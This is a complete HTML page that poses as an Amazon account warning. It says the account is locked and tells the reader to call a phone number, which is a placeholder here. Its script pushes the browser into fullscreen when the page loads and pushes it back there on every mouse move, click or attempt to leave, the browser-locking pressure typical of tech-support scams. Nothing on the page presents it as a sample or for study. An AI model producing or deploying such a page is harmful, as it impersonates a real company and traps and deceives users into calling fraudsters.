<!DOCTYPE html>
<html>
<head>
    <title>Amazon Account Warning</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; }
        .logo { width: 150px; }
        .warning { background-color: #ffdddd; padding: 20px; border: 1px solid #ff9999; margin-top: 20px; }
        .message { font-size: 18px; color: #333; }
        .number { font-size: 24px; color: #007185; margin-top: 10px; }
        .exit { position: fixed; bottom: 20px; right: 20px; }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.documentElement.requestFullscreen().catch(err => {
                console.error('Failed to enter fullscreen mode:', err);
            });

            window.addEventListener('mousemove', function() {
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen().catch(err => {
                        console.error('Failed to enter fullscreen mode:', err);
                    });
                }
            });

            window.addEventListener('click', function() {
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen().catch(err => {
                        console.error('Failed to enter fullscreen mode:', err);
                    });
                }
            });

            document.addEventListener('fullscreenchange', function() {
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen().catch(err => {
                        console.error('Failed to enter fullscreen mode:', err);
                    });
                }
            });

            document.addEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    document.exitFullscreen().catch(err => {
                        console.error('Failed to exit fullscreen mode:', err);
                    });
                }
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/200px-Amazon_logo.svg.png" alt="Amazon Logo" class="logo">
        </div>
        <div class="warning">
            <div class="message">Your Amazon account has been locked due to suspicious activity on your account.</div>
            <div class="number">Please call our toll-free number <strong>+1 000 000 0000</strong> to resolve the issue.</div>
        </div>
        <div class="exit">Press ESC to exit</div>
    </div>
</body>
</html>
